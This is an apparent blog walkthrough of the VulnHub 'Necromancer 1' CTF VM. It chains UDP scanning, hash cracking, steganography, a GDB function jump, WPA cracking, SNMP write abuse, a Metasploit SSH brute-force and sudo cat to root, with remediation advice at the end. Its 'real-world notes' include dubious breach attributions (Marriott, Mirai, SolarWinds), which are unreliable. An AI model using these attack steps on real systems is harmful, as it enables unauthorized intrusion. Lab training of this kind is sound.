# VulnHub: The Necromancer 1 — Rise of the Dead Walkthrough

Alright guys!! Who would have thought a CTF could feel like a full dark fantasy campaign? The Necromancer 1 legit takes you through UDP spells, base64 incantations, wireless packet hexes, SNMP rituals, and binary necromancy in GDB before you finally grab root. No cap, this one is fr fr one of the most creative puzzle chains I have ever seen on VulnHub. ( ͡° ͜ʖ ͡°)

Special thanks to **xerubus** for this incredibly layered challenge. The way each flag unlocks the next service is pure CTF artistry, dude. The hint about "listening on port 4444" lowkey broke my brain for a minute, noice design honestly.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | The Necromancer: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/the-necromancer-1,154/ |
| **Techniques** | UDP scanning, netcat UDP interaction, MD5 cracking, TCP listener, base64 decoding, steganography (binwalk), CeWL wordlist, dirb enumeration, GDB binary exploitation, aircrack-ng WPA cracking, SNMP manipulation, SSH brute-force, sudo misconfiguration |
| **CVEs** | N/A (intentionally vulnerable puzzle VM; techniques mirror real-world patterns) |

> **Hints from the author:**
> "There are 11 flags to collect and each flag unlocks the next step to root."

---

## Attack Summary

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[UDP scan: nmap -sU discovers port 666]
    |
    v
[nc -nvu TARGET 666 -> tcpdump reveals callback on TCP 4444]
    |
    v
[nc -nvlp 4444 -> receives base64 payload -> decode -> FLAG 1 + MD5]
    |
    v
[crack MD5 "opensesame" -> send back via UDP 666 -> FLAG 2 -> redirect to HTTP]
    |
    v
[HTTP port 80: pileoffeathers.jpg -> binwalk -> hidden ZIP -> feathers.txt -> FLAG 3]
    |
    v
[base64 in feathers.txt -> path /amagicbridgeappearsatthechasm]
    |
    v
[CeWL mythology wordlist -> dirb /amagicbridgeappearsatthechasm -> /talisman binary]
    |
    v
[GDB: info functions -> jump chantToBreakSpell -> FLAG 4 -> hint UDP 31337]
    |
    v
[crack MD5 "blackmagic" -> nc -nvu TARGET 31337 -> FLAG 5 -> .cap file download]
    |
    v
[aircrack-ng necromancer.cap + rockyou -> WPA key "death2all"]
    |
    v
[snmpwalk -c death2all TARGET -> snmpset unlock door -> FLAG 7]
    |
    v
[crack FLAG 7 MD5 -> SSH username "demonslayer"]
    |
    v
[Metasploit ssh_login brute-force -> password "12345678"]
    |
    v
[SSH as demonslayer -> FLAGS 8-10 via UDP 777 quiz]
    |
    v
[sudo -l -> (ALL) NOPASSWD: /bin/cat -> sudo /bin/cat /root/flag11.txt]
    |
    v
[ROOT + FLAG 11]
```

---

## Methodology

1. Host discovery on the local segment to identify the target IP
2. TCP scan returns nothing; UDP scan reveals the puzzle entry point on port 666
3. Netcat interaction plus tcpdump intercept to receive the TCP callback and decode flags
4. HTTP steganography: embedded ZIP inside JPEG image, extracted with binwalk
5. CeWL mythology wordlist generation; directory brute-force to discover the hidden binary
6. GDB binary analysis: jump to non-called function `chantToBreakSpell`
7. Wireless handshake capture cracking with aircrack-ng (WPA2 key)
8. SNMP community string abuse: read then write-unlock to advance the puzzle
9. SSH brute-force with Metasploit ssh_login module
10. Privilege escalation via passwordless sudo on `/bin/cat` to read root flag

---

## Step 1 — Identifying the Target

Every boot2root starts with knowing your target. In a local VMware or VirtualBox lab, the target sits somewhere on your subnet. We use arp-scan to find it fast, no cap.

```bash
# Identify your local interface and subnet first
route -n
# Then scan:
arp-scan --localnet --ignoredups
# Alternative:
nmap -sn 192.168.0.0/24
```

Expected output:

```
192.168.0.110   08:00:27:XX:XX:XX   PCS Systemtechnik GmbH (VirtualBox)
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Step 2 — TCP Recon Returns Nothing (the First Trick)

Here is where a lot of beginners rage-quit bruh. You run the standard nmap TCP scan and get absolutely nothing back. Rekt. The VM is not broken; it is the puzzle. The whole challenge starts on UDP, which means if you forget `-sU` you are done before you even start.

```bash
# Full TCP scan first (will return nothing)
nmap -A -T4 -p- 192.168.0.110
```

Expected output: All ports filtered or closed. ¯\_(ツ)_/¯

Now the UDP scan:

```bash
# UDP scan: slower but REQUIRED here
nmap -sU -T4 --top-ports 1000 192.168.0.110
# Or brute all UDP ports (slow, but thorough):
nmap -sU -T4 -p- 192.168.0.110
```

Expected output:

```
PORT    STATE  SERVICE
666/udp open   doom
```

> **Real-world note:** UDP-based C2 channels are a real APT evasion technique. APT3 and APT28 have both leveraged UDP-based beaconing to blend with DNS and NTP traffic and evade TCP-focused monitoring. Reference: https://attack.mitre.org/groups/G0022/

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1095 Non-Application Layer Protocol]

---

## Step 3 — UDP 666, Netcat, and the TCP Callback

This is where the dark magic starts fr fr. Sending a netcat packet to UDP port 666 triggers the VM to call back to you on TCP 4444. You need to be listening before you trigger the callback, dude.

```bash
# Set up the listener FIRST
nc -nvlp 4444
```

Now in a second terminal:

```bash
# Poke the UDP service
nc -nvu 192.168.0.110 666
# Or send a newline:
echo "" | nc -nvu 192.168.0.110 666
```

Use tcpdump to confirm the callback direction if your nc session is slow:

```bash
tcpdump -i eth0 host 192.168.0.110
```

Your listener on 4444 receives a base64-encoded blob. Decode it:

```bash
echo "<RECEIVED_BASE64>" | base64 -d
```

Expected result: Flag 1 is an MD5 hash. Crack it with hashcat or an online tool:

```bash
hashcat -m 0 -a 0 flag1.txt /usr/share/wordlists/rockyou.txt
# Or check crackstation.net (legit for CTF, not for prod)
```

The hash resolves to: `opensesame`

Send it back to the UDP service:

```bash
echo "opensesame" | nc -nvu 192.168.0.110 666
```

Flag 2 comes back and the hint points you to HTTP on port 80. Bingo!!

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell] [T1040 Network Sniffing]

---

## Step 4 — HTTP Steganography: Image Hiding a ZIP

Port 80 serves a page with just one image: `pileoffeathers.jpg`. Classic CTF steganography trap. The image is not an image, dude. Well, it is also an image, but it is hiding a ZIP archive inside it. Tools like binwalk reveal embedded files in binary blobs.

> **What is steganography?**
> Steganography is the practice of hiding data inside an innocuous carrier file (image, audio, video). Unlike encryption, the hidden content is invisible to casual inspection. Attackers use it for data exfiltration, C2 channels, and payload delivery.
> Reference: https://owasp.org/www-community/attacks/Steganography_Attack

```bash
# Download the image
wget http://192.168.0.110/pileoffeathers.jpg

# Scan for embedded content
binwalk pileoffeathers.jpg
```

Expected output:

```
DECIMAL   HEXADECIMAL   DESCRIPTION
0         0x0           JPEG image data
xxxxxx    0xxxxxx       Zip archive data, at least v2.0 to extract
```

Extract it:

```bash
binwalk -e pileoffeathers.jpg
# Or rename and unzip manually:
cp pileoffeathers.jpg pileoffeathers.zip
unzip pileoffeathers.zip
cat feathers.txt
```

feathers.txt contains a base64-encoded string. Decode it:

```bash
cat feathers.txt | base64 -d
```

You get Flag 3 and a hidden directory path: `/amagicbridgeappearsatthechasm`. Noice. •̀ᴗ•́

> **Real-world note:** Steganography-based C2 exfiltration was observed in campaigns attributed to APT32 (OceanLotus), who embedded C2 instructions inside PNG pixel data. Reference: https://www.welivesecurity.com/2019/04/09/oceanlotus-malware-update/

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1005 Data from Local System]

---

## Step 5 — CeWL Wordlist + Directory Brute-Force

The hidden path `/amagicbridgeappearsatthechasm` exists but has subdirectories locked behind a themed wordlist. The challenge theme is mythology, so a generic wordlist will not cut it here. CeWL generates context-aware wordlists by crawling a URL, which is exactly what we need.

```bash
# Build a mythology-themed wordlist from Wikipedia
cewl https://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 \
  -w /tmp/magicItems.txt -v

# Brute-force the hidden path
dirb http://192.168.0.110/amagicbridgeappearsatthechasm \
  /tmp/magicItems.txt
# Alternative with gobuster (faster):
gobuster dir -u http://192.168.0.110/amagicbridgeappearsatthechasm \
  -w /tmp/magicItems.txt
```

You find the path `/talisman`. Download the binary:

```bash
wget http://192.168.0.110/amagicbridgeappearsatthechasm/talisman
chmod +x talisman
./talisman
# Output: just a prompt, no useful output yet
```

> **MITRE ATT&CK:** [T1083 File and Directory Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Step 6 — Binary Exploitation with GDB

Running `talisman` does nothing visible. The trick is that there is a second function inside the binary that is never called in the normal flow. GDB lets us jump directly to it, bypassing the intended execution path. This is low-key the coolest step in the whole chain fr fr.

> **What is this technique?**
> By setting a breakpoint and using GDB's `jump` command, we redirect execution to an arbitrary address inside the binary. This simulates a class of real vulnerabilities including return-oriented programming (ROP) and function pointer overwrites.
> Reference: https://gcc.gnu.org/onlinedocs/gdb/

```bash
gdb talisman

(gdb) info functions
# Lists all functions, including hidden ones
# You will see: wearTalisman, chantToBreakSpell

(gdb) break main
(gdb) run
(gdb) jump chantToBreakSpell
```

Expected output:

```
FLAG 4: [MD5 hash]
Head to UDP port 31337 with "blackmagic"
```

Crack the MD5, send the magic word:

```bash
echo "blackmagic" | nc -nvu 192.168.0.110 31337
```

Flag 5 is returned along with a URL to download a wireless capture file. ԅ(≖‿≖ԅ)

> **Real-world note:** Function pointer overflows and ROP chains are used in real APT implant exploitation. Groups like Equation Group exploited similar binary-level techniques in ETERNALBLUE payload delivery. Reference: https://attack.mitre.org/groups/G0020/

> **MITRE ATT&CK:** [T1203 Exploitation for Client Execution] [T1068 Exploitation for Privilege Escalation]

---

## Step 7 — Wireless Capture Cracking with aircrack-ng

The UDP 31337 response provides a `.cap` file URL. Download it and crack the WPA2 handshake.

```bash
wget http://192.168.0.110/<path>/necromancer.cap

# Crack WPA handshake with rockyou
aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
```

Expected output:

```
KEY FOUND! [ death2all ]
```

This is now your SNMP community string. ಠᴗಠ

> **Real-world note:** WPA2 handshake cracking (offline dictionary attack) is identical to what attackers used against corporate wireless networks in the 2018 Marriott breach perimeter phase. Reference: https://www.cisa.gov/news-events/alerts/2018/11/30/marriott-data-breach

> **MITRE ATT&CK:** [T1040 Network Sniffing] [T1110.003 Brute Force: Password Spraying]

---

## Step 8 — SNMP Enumeration and Write-Access Manipulation

SNMP (Simple Network Management Protocol) is one of those "legacy is a liability" protocols. If you know the community string (basically: the password), you can read device config AND write to it if the server allows. Here the write access lets us "unlock a door" in the puzzle chain.

> **What is SNMP community string abuse?**
> SNMP v1/v2c uses community strings for authentication. Default strings like `public` and `private` are widely known. Write access via `private` or a custom string lets attackers modify system descriptions, interface configs, or custom OIDs.
> Reference: https://cwe.mitre.org/data/definitions/1188.html

```bash
# Enumerate SNMP with cracked community string
snmpwalk -c death2all -v 1 192.168.0.110
```

You will see a "locked door" OID. Unlock it by writing a new value:

```bash
snmpset -c death2allrw -v 1 192.168.0.110 \
  iso.3.6.1.2.1.1.6.0 s "Unlocked"

# Verify:
snmpwalk -c death2all -v 1 192.168.0.110
```

Flag 7 is returned. Its MD5 cracks to: `demonslayer`, which is the SSH username.

> **Real-world note:** SNMP write access was the root cause of the 2014 ISP-level BGP hijacking incidents, where attackers used `private` community strings to reroute traffic. Default SNMP strings are still found in production environments during pentests in 2025. Reference: https://attack.mitre.org/techniques/T1602/002/

> **MITRE ATT&CK:** [T1602.002 Data from Configuration Repository: Network Device Configuration Dump] [T1078 Valid Accounts]

---

## Step 9 — SSH Brute-Force with Metasploit

Now we have a username but no password. Time to go oldschool brute-force with Metasploit's ssh_login module. rockyou.txt will do the job here since the password is intentionally weak.

```bash
msfconsole -q

use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.0.110
set username demonslayer
set pass_file /usr/share/wordlists/rockyou.txt
set verbose true
run
```

Expected output:

```
[+] 192.168.0.110:22 - Success: 'demonslayer:12345678'
```

Log in:

```bash
ssh demonslayer@192.168.0.110
# Password: 12345678
```

> **Real-world note:** SSH brute-force against exposed port 22 is one of the most common attack vectors in the wild. In 2023, Shodan indexed over 23 million devices with SSH exposed, many with weak or default credentials. The Mirai botnet variants still brute-force SSH/Telnet at scale. Reference: https://www.shodan.io/report/ssh

> **MITRE ATT&CK:** [T1110.001 Brute Force: Password Guessing] [T1021.004 Remote Services: SSH]

---

## Step 10 — UDP 777 Trivia Quiz and Remaining Flags

Once logged in via SSH, there is a local UDP quiz on port 777. Connect to it and answer the mythology trivia questions to unlock flags 8, 9, and 10.

```bash
nc -u localhost 777
# Answer: Kelewan
# Answer: Mephistopheles
# Answer: Hedge
```

Also check for hidden files in the home directory:

```bash
ls -la ~
cat .smallvile
```

> **MITRE ATT&CK:** [T1005 Data from Local System] [T1083 File and Directory Discovery]

---

## Step 11 — Privilege Escalation via sudo /bin/cat

Classic misconfiguration. The user has passwordless sudo on `/bin/cat`. Even a read-only binary is a privesc vector when you can read arbitrary files as root. Straight up rekt by config, bruh.

> **What is sudo misconfiguration?**
> When `/etc/sudoers` grants `NOPASSWD` access to any binary, even read-only ones, an attacker can read sensitive files (like `/etc/shadow`, `/root/flag.txt`, or private keys) as root. GTFOBins documents hundreds of such escapes.
> Reference: https://gtfobins.github.io/gtfobins/cat/

```bash
sudo -l
# Output: (ALL) NOPASSWD: /bin/cat

# Read the root flag:
sudo /bin/cat /root/flag11.txt
```

Expected output:

```
You have defeated The Necromancer!
...
Flag 11: [final flag value]
```

(☞ﾟヮﾟ)☞ **Got root!! :D**

> **Real-world note:** Passwordless sudo misconfigurations are a top finding in enterprise Linux audits. The 2020 SolarWinds post-exploitation chain included sudo abuse for lateral movement across internal Linux hosts. Reference: https://msrc-blog.microsoft.com/2021/06/25/analyzing-solorigate/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/cat/

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|--------------|
| Flag 1 | MD5 hash | TCP 4444 callback | `opensesame` |
| Flag 2 | Response | UDP 666 reply | Puzzle advance |
| Flag 3 | Base64 | feathers.txt (ZIP in JPEG) | Path reveal |
| Flag 4 | MD5 hash | GDB jump to chantToBreakSpell | `blackmagic` |
| Flag 5 | Response | UDP 31337 | .cap file URL |
| WPA Key | `death2all` | necromancer.cap cracked | SNMP community |
| Flag 7 | MD5 hash | SNMP OID | `demonslayer` (SSH user) |
| Credential | `demonslayer:12345678` | SSH brute-force | SSH login |
| Flags 8-10 | Trivia responses | UDP 777 quiz | Puzzle advance |
| Flag 11 | Root flag | `/root/flag11.txt` | via `sudo /bin/cat` |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | TCP-only scans miss UDP services | IoT devices, legacy OT/ICS systems, DNS, SNMP are all UDP; skipping UDP leaves huge blind spots | Always include `-sU` in your recon, especially in internal network assessments |
| 2 | SNMP default/weak community strings with write access | SNMP v1/v2c is still deployed in thousands of routers, switches, and printers; `public`/`private` strings are almost universal | Disable SNMP v1/v2c; enforce SNMPv3 with AuthPriv; firewall UDP 161/162 |
| 3 | WPA2 weak passphrase cracked offline | Corporate wireless still relies on WPA2-PSK in many SMEs; offline dictionary attacks require only a captured handshake | Enforce strong (20+ char) random WPA2/3 passphrases; consider WPA3 Enterprise |
| 4 | Passwordless sudo on utility binaries | Even `/bin/cat` becomes root read-access; auditors regularly find `NOPASSWD` entries in production cron and CI runners | Review `/etc/sudoers` and sudoers.d/; enforce least-privilege; require password for ALL sudo |
| 5 | SSH brute-force succeeds with weak password | Port 22 exposed to the internet invites constant brute-force; `12345678` is in every wordlist | Enforce key-based SSH auth; disable password auth; implement fail2ban; move port (security-in-depth) |

**Why does this matter outside the lab?**

The Necromancer simulates a real attack chain that maps almost perfectly to IoT and legacy network compromises. In 2016, the Mirai botnet used nearly identical techniques: UDP service enumeration, SNMP default credentials, and SSH brute-force to compromise hundreds of thousands of devices. The combination of no authentication, legacy protocols (SNMP v1/v2), and weak credentials is still the number one root cause in SME network breaches as of 2024.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | TA0002 | Exploitation for Client Execution | T1203 |
| Credential Access | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Credential Access | TA0006 | Network Sniffing | T1040 |
| Credential Access | TA0006 | Data from Configuration Repository | T1602.002 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Collection | TA0009 | Data from Local System | T1005 |
| Defense Evasion | TA0005 | Obfuscated Files: Steganography | T1027.003 |
| Privilege Escalation | TA0004 | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation | T1068 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Disable SNMP v1/v2c; migrate to SNMPv3 with AuthPriv mode; restrict SNMP to a dedicated management VLAN
2. Replace WPA2-PSK with WPA3-Enterprise or WPA2-Enterprise with RADIUS; enforce 20+ character passphrases on PSK networks
3. Disable SSH password authentication; enforce key-based auth; implement fail2ban with aggressive thresholds on port 22
4. Audit and remove all `NOPASSWD` sudo entries; require password for every sudo invocation
5. Firewall UDP ports not explicitly required; implement ingress/egress filtering for non-essential UDP traffic
6. Strip embedded data from all publicly accessible images; implement content security policies on web servers

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the affected segment from the rest of the network (VLAN segregation)
- Rotate ALL SNMP community strings and SSH credentials immediately
- Block UDP 161/162 at perimeter unless explicitly required for monitoring
- Audit `/etc/sudoers` and `/etc/sudoers.d/` for `NOPASSWD` entries
- Review SSH auth logs for evidence of prior successful brute-force attempts

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-Factor Authentication) to counter T1110 brute-force attacks
- D3-IVA (Input Validation) to harden web application endpoints against T1190
- D3-OPS (OS Process Sandboxing) to limit SUID/sudo abuse T1548
- D3-CTS (Credential Transmission Scoping) to protect SNMP and SSH credential exposure

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID): Maintain complete asset inventory including UDP-only devices (ID.AM-1)
- Protect (PR): Enforce MFA and key-based authentication (PR.AC-4, PR.AC-7)
- Detect (DE): Monitor for UDP anomalies and SSH brute-force patterns (DE.CM-1, DE.CM-7)
- Respond (RS): Isolate segment and rotate credentials on detection (RS.MI-1, RS.MI-2)
- Recover (RC): Restore from clean baseline; verify no persistence remains (RC.RP-1)

**NIST SP 800-53 (Rev. 5) Controls:**
- IA-5: Authenticator Management (password complexity, SSH key enforcement)
- IA-8: Identification and Authentication (non-organizational users)
- AC-6: Least Privilege (sudo NOPASSWD removal)
- CM-7: Least Functionality (disable SNMP v1/v2c; disable UDP services not required)
- SI-2: Flaw Remediation (patch management for SNMP and SSH daemons)
- SC-8: Transmission Confidentiality and Integrity (replace SNMP v1/v2 with v3)

**CISA Known Exploited Vulnerabilities:**
- While no specific CVE is assigned to this VM, SNMP default credential abuse is referenced in CISA Advisory AA22-117A (2022) covering attacks on critical infrastructure
- SSH brute-force is a top-5 initial access vector per CISA's 2023 Top Routinely Exploited Vulnerabilities report
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS
- Practice: Identity and Access Management; Enforce least-privilege credentials for all service accounts
- Target MIL: MIL-2 (defined, documented, and managed practices)
- Domain: SITUATIONAL AWARENESS
- Practice: Logging and Monitoring; detect UDP anomalies, SNMP write operations, and SSH brute-force
- Target MIL: MIL-2

---

## Final Thoughts

Thanks to **xerubus** for crafting a CTF that genuinely feels like a dark fantasy adventure. The flag-chaining mechanic, where each flag unlocks the next service, is a masterclass in puzzle design. If you found yourself rage-quitting because TCP returned nothing, you just learned one of the most valuable lessons in real-world network security: always scan UDP.

The Necromancer maps almost perfectly to how IoT and legacy network compromises unfold in the real world: UDP recon, SNMP abuse, weak wireless credentials, SSH brute-force, and a misconfigured sudo. Every step in this VM appears in real penetration test reports. That makes it a genuinely valuable training ground beyond just CTF points.

If this walkthrough helped you level up, share it with your crew and keep grinding. The next VM is waiting.

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
